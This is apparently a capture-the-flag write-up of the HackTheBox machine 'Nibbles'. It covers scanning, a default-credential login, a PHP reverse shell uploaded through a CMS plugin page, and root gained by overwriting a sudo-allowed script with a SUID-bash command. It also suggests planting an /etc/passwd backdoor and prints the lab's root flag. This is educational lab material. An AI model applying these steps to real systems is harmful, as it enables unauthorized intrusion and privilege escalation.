---
title: Nibbles
published: 2025-02-06
description: Writeup for an easy labeled linux based HTB machine named Nibbles.
image: https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/nibbles/nibbles_info.png
tags: [HackTheBox, Linux, Machines]
category: Writeups
draft: false
---

# <center>Nibbles</center>


Hello there, let's try an easy labeled linux based HTB machine `Nibbles`.

## Initial Step

- Download your open vpn configuration file and connect to htb vpn.
    - ```bash
        sudo openvpn <configuratio_file_name>
      ```
- Join the machine to get an IP. (in my case it is 10.10.11.242).
- tasks given:
    - submit user flag (32 hex characters).
    - submit root flag (32 hex characters).

Now we are good to go. we can access the website through our browser. Now let's dive into our actual hacking stuffs 😉. (Disclaimer: By "hacking", I meant <strong><i>ETHICAL</strong> Hacking</i>)

<hr>

## Scanning and Enumeration

- performing agressive nmap scan on the given ip. 
```bash
┌──(cyb3ritic㉿kali)-[~]
└─$ nmap -A -T4 10.10.10.75                 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-22 18:34 IST
Nmap scan report for 10.10.10.75
Host is up (0.075s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.14, Linux 3.8 - 3.16
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 143/tcp)
HOP RTT      ADDRESS
1   73.24 ms 10.10.14.1
2   74.74 ms 10.10.10.75

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.15 seconds
```

Cool, only two ports are open, 22 for SSH, and 80 for Apache. Checking on SSH would be the last thing I'd try 😅, so let's explore the website part.

![landing page of website](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/nibbles/landing_page.png)

- the page seems normal, but in the developer section, we can see a directory `/nibbleblog` listed. The machine is more like of ctf type.

- checking `nibbleblog` directory, it feels more like a CMS.

![CMS landing page](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/nibbles/cms.png)


Time for some directory enumeration. Let's use gobuster.

```bash
┌──(cyb3ritic㉿kali)-[~]
└─$ gobuster dir -u http://10.10.10.75/nibbleblog/ -w /usr/share/wordlists/dirb/common.txt -t 100 -q
/.hta                 (Status: 403) [Size: 301]
/.htaccess            (Status: 403) [Size: 306]
/.htpasswd            (Status: 403) [Size: 306]
/admin                (Status: 301) [Size: 321] [--> http://10.10.10.75/nibbleblog/admin/]
/admin.php            (Status: 200) [Size: 1401]
/content              (Status: 301) [Size: 323] [--> http://10.10.10.75/nibbleblog/content/]
/index.php            (Status: 200) [Size: 2987]
/languages            (Status: 301) [Size: 325] [--> http://10.10.10.75/nibbleblog/languages/]
/plugins              (Status: 301) [Size: 323] [--> http://10.10.10.75/nibbleblog/plugins/]
/README               (Status: 200) [Size: 4628]
/themes               (Status: 301) [Size: 322] [--> http://10.10.10.75/nibbleblog/themes/] 
```

Hmm, soo many interesting files. After travelling through them manually, we can get a login page at `/admin.php`. further more, while exploring, we can find username `admin` as a user in `/content/private/users.xml` file.

```xml
<users>
<user username="admin">
<id type="integer">0</id>
<session_fail_count type="integer">0</session_fail_count>
<session_date type="integer">1514544131</session_date>
</users>
```


## Initial foothold

- Using some guesses and a fact that in older HTB machines, generally the name of machine is the password, I was able to login in admin.php with credentials `admin:nibbles`.


exploring for some time in admin dashboaard, we have a plugin page,where we can input images. and whenever i see someplace to upload file, i go for file upload vulnerability.

![admin dashboard](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/nibbles/admin_dashboard.png)


![file upload](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/nibbles/file_upload.png)

Let's upload the reverseshell from pentest monkey. The code is getting stored in `/content/private/plugins/my_image` directory and is getting named as `image.php`.

![reverse shell uploaded](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/nibbles/revshell_uploaded.png)

Opening the file, landed me to reverseshell on my netcat listener. after certain directory traversing and exploring i was able to get my user flag.

![user flag explored](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/nibbles/user_flag.png)


## Privilege Escalation

wohooo, we acomplished our first task. Now time to get root.

`sudo -l` revealed that the user `nibbler` (that we are logged into) can execute `/home/nibbler/personal/stuff/monitor.sh` bash file with as root, without any password.

```bash
nibbler@Nibbles:/home/nibbler$ sudo -l
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

Hmm, we have a file, that can be run by us with sudo previlege. I don't actually care what this bash script is doing, if i have permission to edit it, i can modify it and run any command that i wish. So let's check for the file permissions. But wait, from the previous emumeration, we got personal.zip file in nobbler directory. So we need to first unzip it and then check for file permission.

```bash
nibbler@Nibbles:/home/nibbler$ ls
personal.zip  user.txt
nibbler@Nibbles:/home/nibbler$ unzip personal.zip  
Archive:  personal.zip
   creating: personal/
   creating: personal/stuff/
  inflating: personal/stuff/monitor.sh  
nibbler@Nibbles:/home/nibbler$ ls
personal  personal.zip  user.txt
nibbler@Nibbles:/home/nibbler$ cd personal
nibbler@Nibbles:/home/nibbler/personal$ ls
stuff
nibbler@Nibbles:/home/nibbler/personal$ cd stuff
nibbler@Nibbles:/home/nibbler/personal/stuff$ ls
monitor.sh
nibbler@Nibbles:/home/nibbler/personal/stuff$ ls -al monitor.sh 
-rwxrwxrwx 1 nibbler nibbler 4015 May  8  2015 monitor.sh
```

Cool, we have all 777 permission for monitor.sh. Now it's cherry on a cake. We can modify it in any way we want and grab the root flag. Here I will be adding SUID bit to /bin/bash so that i can get bash shell as a root user. But, alternatively u can use some other tricks as well. For example:
- directly cat out the flag from root directory 
- add a backdoor by creating a new entry in /etc/passwd file with root privilege
- run a reverse shell script to get another shell with root previlege and so on...


so first i modified the content of monitor.sh using the command `echo "chmod 4755 /bin/bash" > monitor.sh`. Here `chmod 4755 /bin/bash` is setting a SUID bin to /bin/bash. then simply we can run the shell using `/bin/bash -p` command.

```bash
nibbler@Nibbles:/home/nibbler/personal/stuff$ ls -al monitor.sh 
-rwxrwxrwx 1 nibbler nibbler 21 Feb  6 11:37 monitor.sh
nibbler@Nibbles:/home/nibbler/personal/stuff$ echo "chmod 4755 /bin/bash" > monitor.sh 
nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo /home/nibbler/personal/stuff/monitor.sh
nibbler@Nibbles:/home/nibbler/personal/stuff$ /bin/bash -p
bash-4.3# whoami
root
bash-4.3# cat /root/root.txt
5cbd47bc5a874949a4e8589f2849679c
```

Hurray! we successfully acquired the root flag 🤩.

Thankyou for reading my writeup cum walkthrough. Hope this was really informative and interesting for you.
 ![nibbles pwned](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/nibbles/nibbles_pwned.png)